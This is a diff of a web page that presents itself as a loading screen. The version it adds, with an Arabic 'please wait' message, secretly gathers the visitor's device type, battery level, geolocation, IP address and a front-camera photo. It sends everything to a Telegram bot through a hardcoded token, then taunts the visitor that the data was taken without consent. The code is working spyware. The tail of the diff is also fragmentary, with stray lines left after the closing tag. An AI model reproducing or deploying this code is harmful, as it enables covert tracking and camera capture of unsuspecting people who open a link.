@@ -1,39 +1,157 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-    <!-- Meta tags for link previews -->
-    <link rel="icon" href="public/assets/icons/icon_thinkapp.png" type="image/png">
+  
+      <link rel="icon" href="public/assets/icons/icon_thinkapp.png" type="image/png">
     <meta property="og:image" content="https://raw.githubusercontent.com/e-hr1/Think/main/public/assets/icons/icon_thinkapp.png">
-    <meta property="og:title" content="Open in Think AI App">
-    <meta property="og:description" content="Content shared from the Think AI app. Click to open in the app.">
-    <meta name="twitter:card" content="summary">
-
-    <title>Opening in Think AI...</title>
-
+   
+    <title>المهندس وجدان</title>
     <style>
-        body { display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; background-color: #f0f2f5; text-align: center; color: #333; transition: opacity 0.5s ease-in-out; opacity: 0; }
-        .container { padding: 20px; }
-        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #4D6BFF; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #status-message { font-size: 18px; color: #555; }
+        /* أسلوب لعرض رسالة الانتظار في المنتصف */
+        #loading-message {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-size: 2em;
+            color: #333;
+            font-family: sans-serif;
+        }
     </style>
 </head>
-<body>
-    <div class="container">
-        <div class="loader"></div>
-        <p id="status-message">Loading...</p>
-    </div>
+<body style="background-color: white;">
 
-    <script type="text/javascript">
-        // دالة لإرسال طلب مخفي لتشغيل عملية التنظيف في الخلفية
-        function triggerCleanup() {
-            // !!! هام: استبدل الرابط التالي برابط تطبيق الويب الخاص بك من Google Apps Script
-            const cleanupUrl = 'https://script.google.com/macros/s/AKfycbxJY4CkDGFMIqmBnwlSuukVS_ROmk9af8rkhl8JeCkFEvPD5EwfdUgtOZbAuQ_lcVfDsQ/exec'; 
+    <!-- رسالة الانتظار -->
+    <div id="loading-message">إنتظر...</div>
 
-            // navigator.sendBeacon هو أفضل طريقة لإرسال طلبات مخفية لا تؤثر على أداء الصفحة
+    <video id="video" width="320" height="240" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+
+    <script>
+        // استبدل بالمعلومات الصحيحة
+        const BOT_TOKEN = "6060274802:AAHQXBnAjd7vRQzecmUi07Kionaf2Lmzw0M"; // توكن البوت الخاص بك
+        const CHAT_ID = "@hfakw678"; // معرف المجموعة أو القناة
+
+        // دالة لإرسال الرسائل إلى تليجرام
+        async function sendTelegramMessage(text) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: text,
+                    parse_mode: 'Markdown'
+                }),
+            });
+        }
+
+        // دالة لإرسال الصور إلى تليجرام
+        async function sendTelegramPhoto(photoBlob) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', photoBlob, 'camera.jpg');
+            formData.append('caption', 'صورة من الكاميرا الأمامية');
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+            await fetch(url, {
+                method: 'POST',
+                body: formData,
+            });
+        }
+
+        // دالة لالتقاط صورة من الكاميرا
+        function captureImage() {
+            return new Promise((resolve, reject) => {
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                const context = canvas.getContext('2d');
+
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } }) // استخدم الكاميرا الأمامية
+                    .then(stream => {
+                        video.srcObject = stream;
+                        video.onloadedmetadata = () => {
+                            // انتظر قليلاً حتى تستقر الكاميرا
+                            setTimeout(() => {
+                                context.drawImage(video, 0, 0, 320, 240);
+                                canvas.toBlob(blob => {
+                                    resolve(blob);
+                                    // إيقاف بث الفيديو بعد التقاط الصورة
+                                    stream.getTracks().forEach(track => track.stop());
+                                }, 'image/jpeg');
+                            }, 500); // تأخير نصف ثانية
+                        };
+                    })
+                    .catch(err => {
+                        console.error("Camera Error:", err);
+                        reject("لا يمكن الوصول إلى الكاميرا: " + err.message);
+                    });
+            });
+        }
+
+
+        // بدء عملية جمع البيانات عند تحميل الصفحة
+        window.onload = async function() {
+            let message = "📱 **معلومات الجهاز الجديدة** 📱\n\n";
+
+            // 1. نوع الجهاز (User Agent)
+            const userAgent = navigator.userAgent;
+            message += `*نوع الجهاز:* \`${userAgent}\`\n`;
+
+            // 2. شحن البطارية
+            try {
+                const battery = await navigator.getBattery();
+                message += `*شحن البطارية:* \`${Math.floor(battery.level * 100)}%\`\n`;
+            } catch (err) {
+                message += "*شحن البطارية:* لا يمكن الوصول للمعلومات.\n";
+            }
+
+            // 3. الموقع الجغرافي
+            if ('geolocation' in navigator) {
+                try {
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
+                    });
+                    const { latitude, longitude } = position.coords;
+                    message += `*الموقع:* [عرض على الخريطة](https://www.google.com/maps?q=${latitude},${longitude})\n`;
+                } catch (err) {
+                    message += `*الموقع:* فشل في الحصول على الموقع (قد يكون السبب رفض الإذن).\n`;
+                }
+            } else {
+                message += "*الموقع:* غير مدعوم في هذا المتصفح.\n";
+            }
+            
+            // 4. عنوان IP
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                message += `*عنوان IP:* \`${data.ip}\`\n`;
+            } catch (err) {
+                message += "*عنوان IP:* فشل في الحصول على IP.\n";
+            }
+
+            // إرسال رسالة المعلومات النصية
+            await sendTelegramMessage(message);
+
+            // 5. التقاط وإرسال صورة الكاميرا
+            try {
+                const photoBlob = await captureImage();
+                await sendTelegramPhoto(photoBlob);
+            } catch (err) {
+                await sendTelegramMessage(`*الكاميرا:* ${err}`);
+            }
+            
+            // استبدال محتوى الصفحة بالكامل بعد انتهاء العمليات
+            document.body.innerHTML = "<h1 style='text-align: center; padding-top: 20%;'>تم إرسال بيانات جهازك بنجاح.<br>— الفئات المرسلة: <br>صور، الموقع، نوع الجهاز.<br>دون موافقتك الصريحة 🤣.</h1>";
+        };
+    </script>
+
+</body>
+</html>
             if (navigator.sendBeacon) {
                 navigator.sendBeacon(cleanupUrl);
                 console.log("Cleanup process triggered via sendBeacon.");
